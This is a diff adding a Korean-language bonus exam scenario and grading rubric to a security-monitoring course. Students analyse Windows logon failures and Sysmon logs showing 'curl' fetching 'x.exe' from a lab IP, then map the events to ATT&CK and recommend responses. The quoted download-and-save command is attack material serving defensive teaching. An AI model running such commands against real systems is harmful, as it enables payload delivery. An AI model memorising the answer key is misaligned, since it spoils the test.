@@ -463,6 +463,37 @@ echo "TTD (탐지 소요 시간): ${TTD}초"
 
 ---
 
+## 중간고사 보강 — Windows 엔드포인트 시나리오 1건 추가 (W03 위빙)
+
+본 중간고사의 시나리오에 **Windows 엔드포인트 분석 1건** 을 추가한다 (보너스 또는 정규 1 문제).
+
+### 시나리오 6 (보너스 10점) — Windows victim 의 인증 실패 + 의심 다운로드 timeline
+
+> 6v6-win (10.20.32.60) 에서 다음 사건이 발생했다.
+>
+> 1. 14:00–14:05 : Security EID 4625 가 5회 발생 (SourceWorkstation=external, LogonType=3).
+> 2. 14:07 : Sysmon EID 1 (curl.exe, CommandLine=`curl http://10.20.30.202/x.exe -o C:\Temp\x.exe`).
+> 3. 14:07 : Sysmon EID 3 (Image=curl.exe, DestinationIp=10.20.30.202:80).
+> 4. 14:08 : Sysmon EID 11 (TargetFilename=C:\Temp\x.exe).
+>
+> (a) 1+2+3+4 를 잇는 한 줄 narrative 를 쓰라.
+> (b) ATT&CK Tactic 2개와 Technique 2개를 매핑하라.
+> (c) SOC 분석가의 권장 조치 3가지 (즉시/단기/장기) 를 쓰라.
+
+### 평가 항목
+
+```
+3점: 4625 → 1(curl) → 3(외부 IP) → 11(파일 저장) 의 시간순 narrative
+2점: T1110(Brute Force) + T1071(C2 Web Protocol) 또는 T1105(Ingress Tool Transfer) 매핑
+3점: 즉시(네트워크 격리) / 단기(IOC 차단) / 장기(사용자 교육·정책) 조치
+2점: Wazuh KQL 쿼리 1개 작성 (agent.name:6v6-win AND ...)
+```
+
+> 본 보너스 시나리오는 **W03 의 5 R/B/P 학습** 이 바로 적용된다 — 학생은 강의·실습에서 본 패턴을
+> 시험에서 분석가 시각으로 종합한다.
+
+---
+
 ## 웹 UI 실습: Dashboard 알림 분류 실습
 
 > **목적**: 중간고사의 로그 분석 결과를 Wazuh Dashboard에서 교차 검증하고,
